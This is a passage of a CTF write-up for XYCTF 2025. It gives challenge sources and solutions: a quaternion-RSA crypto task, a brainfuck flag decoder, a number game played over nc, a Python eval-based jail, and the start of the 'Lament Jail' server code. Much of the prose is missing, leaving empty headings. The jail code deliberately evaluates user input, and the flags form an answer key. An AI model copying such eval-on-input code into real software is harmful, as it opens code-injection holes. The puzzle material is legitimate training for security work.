b&#x27;l\x8bd,\xa3\xe7\x87*\xca\n\xd7\x11\xd6n=\xeaS`\xa4w\x94(\xb9\xf9\xb9\xc6\xe3\xc2\xfb\xdb\x80\xf6\x9f\xc7\xd1F&quot;`&#123;;V\xa7&#125;Z\xc0\xc0\xf6&lt;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a> *</h2><blockquote><p>exe</p></blockquote><p><code>flag.txt.enc</code><code>bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835</code></p><p><strong></strong></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> *</h2><blockquote><p></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        self.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(self.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line"></span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(hint) == <span class="number">20</span></span><br><span class="line">hints = ComComplex([bytes_to_long(hint[i:i+<span class="number">5</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>,<span class="number">5</span>)])</span><br><span class="line">keys = ComComplex([<span class="number">0</span>, p, q, r])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>,hints)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift =&#x27;</span>,hints*keys%P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P =&#x27;</span>,P)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line">m = ComComplex([bytes_to_long(flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>)])</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">hint = 375413371936+452903063925i+418564633198j+452841062207k</span></span><br><span class="line"><span class="string">gift = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729+20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171i+22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868j+40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863k</span></span><br><span class="line"><span class="string">P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line"><span class="string">n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"><span class="string">c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> reference</h2><p></p><ul><li><a href="https://blog.weyung.cc/2025/04/04/2025%20XYCTF/#Crypto"></a></li></ul><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="xgctf"><a class="markdownIt-Anchor" href="#xgctf"></a> XGCTF</h2><blockquote><p>2024CTFshowXGCTFLamentXULamentXUdragonkeepwpflagLamentXUXGCTFLamentXUdragonkeepflaghintdragonkeepdragonkeep<br />LamentXU</p></blockquote><p><code>ctfshow</code><code>XGCTF</code><br /><code>dragonkeep</code><a href="https://dragonkeeep.top/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted"></a><br /><img src="https://pic1.zhimg.com/80/v2-ba5e147c9715d7bf3e8e933b0510bdcb_1440w.png" alt="" /><br /><code>flag&#123;1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me&#125;</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><blockquote><p></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;[-]</span><br></pre></td></tr></table></figure><p><code>brainfuck</code><code>AI</code><code>AI</code><code>flag</code><code>&gt;</code><code>[</code><strong></strong><code>&lt;&gt;</code><strong></strong><code>flag</code><strong>ASCII</strong>()</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_bf_string</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().strip()</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="comment">#  &quot;&gt;&quot; </span></span><br><span class="line">        idx_gt = data.find(<span class="string">&quot;&gt;&quot;</span>, pos)</span><br><span class="line">        <span class="keyword">if</span> idx_gt == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#  &quot;&gt;&quot;  &quot;+&quot;</span></span><br><span class="line">        idx = idx_gt + <span class="number">1</span></span><br><span class="line">        count_out = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_out += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment">#  &quot;[&quot;</span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;[&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#  &quot;[&quot;  &quot;&lt;&quot;</span></span><br><span class="line">        idx_bracket = data.find(<span class="string">&quot;&lt;&quot;</span>, idx)</span><br><span class="line">        <span class="keyword">if</span> idx_bracket == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#  &quot;&lt;&quot;  &quot;+&quot;</span></span><br><span class="line">        idx = idx_bracket + <span class="number">1</span></span><br><span class="line">        count_in = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[idx] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            count_in += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="comment">#  &quot;&gt;&quot; </span></span><br><span class="line">        <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(data) <span class="keyword">or</span> data[idx] != <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        product = count_out * count_in</span><br><span class="line">        result += <span class="built_in">chr</span>(product)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#  pos  &quot;&gt;&quot; </span></span><br><span class="line">        pos = idx + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filename = <span class="string">&quot;C:\\Users\\27920\\Desktop\\bf.txt&quot;</span></span><br><span class="line">    decoded = decode_bf_string(filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;:&quot;</span>, decoded)</span><br></pre></td></tr></table></figure><p><code>flag&#123;W3lC0me_t0_XYCTF_2025_Enj07_1t!&#125;</code></p><p><code>.</code>()<br /><code>&lt;[</code><code>&lt;.[</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>flag</code><code>smn.txt</code><strong>base64</strong><strong>jpg</strong><strong></strong><code>XYCTF2025</code><strong></strong><strong></strong><br /><img src="https://pica.zhimg.com/80/v2-b467d0602066750608d0c1fbdc382e36_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-202a1c786a9ac0b51a77671bcd5aa5cc_1440w.png" alt="" /><br /><code>XYCTF&#123;easy_yin_xie_dfbfuj877&#125;</code></p><h2 id="maderctfer"><a class="markdownIt-Anchor" href="#maderctfer"></a> MADerCTFer*</h2><blockquote><p>PRTSharkPRTSharkhard to hack</p></blockquote><p><code>AE</code><code>wp</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> *</h2><blockquote><p>2025130W1ndysosint</p></blockquote><p>()</p><h2 id="greedymen"><a class="markdownIt-Anchor" href="#greedymen"></a> Greedymen*</h2><blockquote><p>Isnt it ironic? Greed isnt limited. Freedom is a limited resource.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">nc <span class="number">8.147</span><span class="number">.132</span><span class="number">.32</span> <span class="number">17479</span></span><br><span class="line">Welcome to the Greedy Game</span><br><span class="line">Your goal <span class="keyword">is</span> to be <span class="keyword">as</span> greedy <span class="keyword">as</span> possible</span><br><span class="line"><span class="number">1.</span>Play</span><br><span class="line"><span class="number">2.</span>Rules</span><br><span class="line"><span class="number">3.</span>Quit</span><br><span class="line"><span class="number">2</span></span><br><span class="line">There are <span class="number">3</span> levels, level <span class="number">1</span>/<span class="number">2</span>/<span class="number">3</span> has number <span class="number">1</span> to <span class="number">50</span>/<span class="number">100</span>/<span class="number">200</span> on board to choose <span class="keyword">from</span></span><br><span class="line">Each number you choose, you get the corresponding points</span><br><span class="line">However, your opponent will choose <span class="built_in">all</span> the factors of the number you choose, <span class="keyword">and</span> get the points of each factor</span><br><span class="line">You can <span class="keyword">not</span> choose numbers that are already assigned to a player</span><br><span class="line">You are only allow to choose the number <span class="keyword">if</span> it has at least one factor <span class="keyword">not</span> choosen</span><br><span class="line">If you can<span class="string">&#x27;t choose anymore, the rest of the board goes to your opponent</span></span><br><span class="line"><span class="string">To make the challenge harder, there is a counter that starts with 19/37/76 in level 1/2/3, each time you choose a number, the counter decreases by 1</span></span><br><span class="line"><span class="string">When it reaches 0, and the game will end, and the unassigned numbers will go to your opponent</span></span><br><span class="line"><span class="string">The challenge is always solvable</span></span><br><span class="line"><span class="string">Player with highest score wins</span></span><br><span class="line"><span class="string">Good Luck!</span></span><br><span class="line"><span class="string">1.Play</span></span><br><span class="line"><span class="string">2.Rules</span></span><br><span class="line"><span class="string">3.Quit</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Level 1/3 50 Numbers</span></span><br><span class="line"><span class="string">Unassigned Numbers: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]</span></span><br><span class="line"><span class="string">Counter: 19</span></span><br><span class="line"><span class="string">Your Score: 0</span></span><br><span class="line"><span class="string">Opponent Score: 0</span></span><br><span class="line"><span class="string">Choose a Number:49</span></span><br><span class="line"><span class="string">Unassigned Numbers: [2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50]</span></span><br><span class="line"><span class="string">Counter: 18</span></span><br><span class="line"><span class="string">Your Score: 49</span></span><br><span class="line"><span class="string">Opponent Score: 8</span></span><br><span class="line"><span class="string">Choose a Number:</span></span><br></pre></td></tr></table></figure><p></p><h2 id="sins"><a class="markdownIt-Anchor" href="#sins"></a> sins*</h2><blockquote><p>Come now, let us settle the matter, says the LORD. Though your sins are like scarlet, they shall be as white as snow; though they are red as crimson, they shall be like wool. - Isaiah 1:18</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For there are three that bear record in heaven, the Father, the Word, and the Holy Ghost&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;But here we have four cases bearing witness&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i_pow</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">4</span> == <span class="number">0</span>: <span class="comment"># as the 40 days of flood</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">1</span>: <span class="comment"># as the 1 true God</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">2</span>: <span class="comment"># as the 2 tablets of stone</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">3</span>: <span class="comment"># as the 3 days in the tomb</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-i&#x27;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;wash away your sins: &quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> <span class="string">&quot;i0123456789+-*%/^=&lt;&gt;~&amp;|:()[]&#x27;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> inp), <span class="string">&quot;invalid char&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(inp) &lt; <span class="number">16</span>, <span class="string">&quot;too long&quot;</span></span><br><span class="line">R = <span class="built_in">eval</span>(<span class="string">f&quot;lambda i: <span class="subst">&#123;inp&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(R(i) == i_pow(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;The_adwa_shall_forgive_thee&#x27;</span>) // <span class="number">2</span>**<span class="number">195</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="lament-jail"><a class="markdownIt-Anchor" href="#lament-jail"></a> Lament Jail*</h2><blockquote><p>H- flag&quot;flag{}&quot;flagflag-1Lament Jail/flagflagflag/flag/bin/rfflagLament Jailflag</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @FileName  :Lament_Jail.py</span></span><br><span class="line"><span class="comment"># @Time      :2025/3/22 12:37:43</span></span><br><span class="line"><span class="comment"># @Author    :LamentXU</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> remove</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> compress, decompress</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Definate all the errors</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageLengthError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PasswordError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTCP</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    The main class when using TCP</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, family: AddressFamily = AF_INET, <span class="built_in">type</span>: SocketKind = SOCK_STREAM</span></span><br><span class="line"><span class="params">                 , proto: <span class="built_in">int</span> = -<span class="number">1</span>, fileno: <span class="built_in">int</span> = <span class="literal">None</span>, is_encrypted: <span class="built_in">bool</span> = <span class="literal">True</span>, AES_key: <span class="built_in">bytes</span> = <span class="literal">None</span>, password: <span class="built_in">bytes</span> = <span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        is_encrypted: use encrypted connection, only for server</span></span><br><span class="line"><span class="string">        AES_key: use a fixed AES_key, None for random, must be 16 bytes, only for server</span></span><br><span class="line"><span class="string">        password: A fixed password is acquired from the client (must smaller than be 100 bytes), if wrong, the connection will be closed</span></span><br><span class="line"><span class="string">            if password is set in server, every time a client connect, the client must send the same password back to the server to accept.</span></span><br><span class="line"><span class="string">            if password is set in client, every time you connect to the server, the password will be sent to the server to verify.</span></span><br><span class="line"><span class="string">            if password is None, no password will be used.</span></span><br><span class="line"><span class="string">        self.Default_message_len: if in encrypted mode, the value must be a multiple of self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        MAKE SURE THE DEFAULT_MESSAGE_LEN OF BOTH SERVER AND CLIENT ARE SAME, Or it could be a hassle</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        self.BLOCK_SIZE = <span class="number">16</span> <span class="comment"># block size of padding text which will be encrypted by AES</span></span><br><span class="line">        <span class="comment"># the block size must be a mutiple of 8</span></span><br><span class="line">        self.default_encoder = <span class="string">&#x27;utf8&#x27;</span>  <span class="comment"># the default encoder used in send and recv when the message is not bytes</span></span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            <span class="keyword">if</span> AES_key == <span class="literal">None</span>:</span><br><span class="line">                self.key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># generate 16 bytes AES code</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.key = AES_key <span class="comment">#TODO check the input </span></span><br><span class="line">            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.key, self.cipher_aes = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        self.default_message_len = <span class="number">1024</span> <span class="comment"># length of some basic message, it&#x27;s best not to go below 1024 bytes</span></span><br><span class="line">        <span class="keyword">if</span> password == <span class="literal">None</span>:</span><br><span class="line">            self.password = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.password = self.turn_to_bytes(password)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(password) &gt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;The password is too long, it must be smaller than 100 bytes&#x27;</span>)</span><br><span class="line">        self.s = socket(family, <span class="built_in">type</span>, proto, fileno)  <span class="comment"># main socket</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">accept</span>(<span class="params">self</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Accept with information exchange and key exchange, return the address of the client</span></span><br><span class="line"><span class="string">        if the password from client is wrong or not set, raise PasswordError</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.s, address = self.s.accept()</span><br><span class="line">        <span class="keyword">if</span> self.key == <span class="literal">None</span>:</span><br><span class="line">            is_encrypted = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_encrypted = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> self.password == <span class="literal">None</span>:</span><br><span class="line">            has_password = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            has_password = <span class="literal">True</span></span><br><span class="line">        info_dict = &#123;</span><br><span class="line">            <span class="string">&#x27;is_encrypted&#x27;</span> : is_encrypted,</span><br><span class="line">            <span class="string">&#x27;has_password&#x27;</span> : has_password&#125;</span><br><span class="line">        info_dict = dumps(info_dict).encode(encoding=self.default_encoder)</span><br><span class="line">        self.s.send(self.turn_to_bytes(<span class="built_in">len</span>(info_dict)))</span><br><span class="line">        self.s.send(info_dict)</span><br><span class="line">        <span class="keyword">if</span> has_password:</span><br><span class="line">            password_length = self.unpadding_packets(self.s.recv(<span class="number">3</span>), 